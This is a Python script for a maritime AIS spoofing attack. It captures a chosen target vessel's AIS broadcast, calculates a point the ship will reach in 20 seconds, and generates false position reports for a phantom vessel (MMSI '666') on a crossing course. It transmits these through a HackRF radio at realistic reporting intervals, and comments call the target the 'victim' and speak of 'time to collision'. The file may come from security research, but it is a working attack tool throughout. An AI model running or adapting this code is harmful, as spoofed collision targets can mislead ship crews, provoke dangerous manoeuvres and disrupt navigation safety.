import subprocess
import time
from pyais import decode, encode_dict
from geopy.distance import distance
from geopy import Point
from AIS_constructor import assembler
from get_coordinates import generate_coordinates


def ascii_to_6bit_binary(ascii_string):
    ascii_table = {
        '0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7,
        '8': 8, '9': 9, ':': 10, ';': 11, '<': 12, '=': 13, '>': 14, '?': 15,
        '@': 16, 'A': 17, 'B': 18, 'C': 19, 'D': 20, 'E': 21, 'F': 22, 'G': 23,
        'H': 24, 'I': 25, 'J': 26, 'K': 27, 'L': 28, 'M': 29, 'N': 30, 'O': 31,
        'P': 32, 'Q': 33, 'R': 34, 'S': 35, 'T': 36, 'U': 37, 'V': 38, 'W': 39,
        '`': 40, 'a': 41, 'b': 42, 'c': 43, 'd': 44, 'e': 45, 'f': 46, 'g': 47,
        'h': 48, 'i': 49, 'j': 50, 'k': 51, 'l': 52, 'm': 53, 'n': 54, 'o': 55,
        'p': 56, 'q': 57, 'r': 58, 's': 59, 't': 60, 'u': 61, 'v': 62, 'w': 63
    }
    binary_string = ''.join(format(ascii_table[char], '06b') for char in ascii_string)
    return binary_string

def generate_strings(signals):
    all_signals = []
    for x in signals:
        signal = encode_dict(x, radio_channel="B", talker_id="AIVDM")[0]
        all_signals.append(signal)
    return all_signals


def generate_full_string(strings):
    strings = [message.split(',')[5] for message in strings]
    final = []
    for x in strings:
        bits = ascii_to_6bit_binary(x)
        ais_signal = assembler(bits)
        final.append(ais_signal)
    return final

def set_reporting_interval(speed_knots):
    if speed_knots <= 3:
        return 180 if speed_knots == 0 else 10  # 3 minutes if anchored, 10 seconds if moving up to 3 knots
    elif 3 < speed_knots <= 14:
        return 10  # 10 seconds for speeds between 3 and 14 knots
    elif 14 < speed_knots <= 23:
        return 6  # 6 seconds for speeds between 14 and 23 knots
    else:
        return 2  # 2 seconds for speeds above 23 knots
    

def realistic_sender(signals, hackrf):
    global speed_knots
    interval = set_reporting_interval(speed_knots)

    for signal in signals:
        result = subprocess.run(
            ['python3.12', 'transmitter.py', signal, hackrf],
            check=False,
            capture_output=True,
            text=True
        )

        print("STDOUT:", result.stdout)
        print("STDERR:", result.stderr)

        time.sleep(interval)

#### We can set the target in the code or as input
#Define the target MMSI
# target_mmsi = "666"
target_mmsi = input("Write the targets mmsi number: ")

# Run listener.py with target_mmsi as an argument
result = subprocess.run(['python3.9', 'listener.py', target_mmsi], check=False, capture_output=True, text=True)

# Print the result from listener.py
print("STDOUT:", result.stdout)  # Contains the decoded message if found
print("STDERR:", result.stderr)  # Contains any errors or warnings

cleaned_stdout = str(result.stdout.strip())[2:-1]  # Removes any leading or trailing whitespace, including newlines and b'string'
print("Decoded Message:", cleaned_stdout)


bin_version = cleaned_stdout.encode('utf-8')



decoded = decode(bin_version) # Decoded AIS message of victim
target_lon = decoded.lon
target_lat = decoded.lat
target_course = decoded.course
target_speed = decoded.speed
time_to_meet = 20  # Time to collision in seconds
distance_to_meet = (target_speed * (time_to_meet / 3600))  # Distance in nautical miles

start_point = Point(target_lat, target_lon)
interception_point = distance(nautical=distance_to_meet).destination(start_point, target_course)
new_start_bearing = target_course + 90  # 90 degrees offset for perpendicular direction
new_start_point = distance(nautical=distance_to_meet).destination(interception_point, new_start_bearing)
extra_step_time = 2  # Added extra 
extra_distance = (target_speed * (extra_step_time / 3600)) 
# Calculate the endpoint slightly beyond the interception point:
endpoint = distance(nautical=extra_distance).destination(interception_point, target_course)
start = [float(new_start_point.longitude), float(new_start_point.latitude)]
end = [float(endpoint.longitude), float(endpoint.latitude)]
speed_knots = 25
mmsi = "666"
spoofed_signals = generate_coordinates(start, end, speed_knots, mmsi)
strings = generate_strings(spoofed_signals)
all_strings = generate_full_string(strings) # Generates all needed AIS messages as a string
realistic_sender(all_strings, "0000000000000000675c62dc30630dcf") # Starts sending the messages